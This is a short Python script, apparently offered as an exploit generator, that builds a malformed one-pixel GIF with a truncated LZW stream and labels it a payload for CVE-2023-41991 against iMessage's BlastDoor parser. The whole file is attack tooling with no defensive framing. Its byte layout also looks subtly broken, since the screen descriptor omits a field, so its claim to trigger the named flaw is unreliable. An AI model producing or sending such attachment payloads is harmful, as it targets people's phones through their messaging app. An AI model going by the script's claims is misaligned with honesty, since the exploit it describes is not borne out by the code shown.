#!/usr/bin/env python3
"""CVE-2023-41991 — iMessage BlastDoor attachment parsing.
Carrier: GIF89a with a truncated LZW stream that trips the sandbox parser."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    return (b"GIF89a" + struct.pack("<HHH", 1, 1, 0x80) + b"\x00\x00\x00\xff\xff\xff"
            + b"\x21\xf9\x04\x01\x00\x00\x00\x00"                       # GCE
            + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00"               # image descriptor
            + b"\x02\x02\x4c\x01\x00")                                  # truncated LZW

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-41991.gif")
    data = build(); out.write_bytes(data)
    print(f"[+] CVE-2023-41991 GIF payload -> {out} ({len(data)} bytes)")

if __name__ == "__main__":
    main()
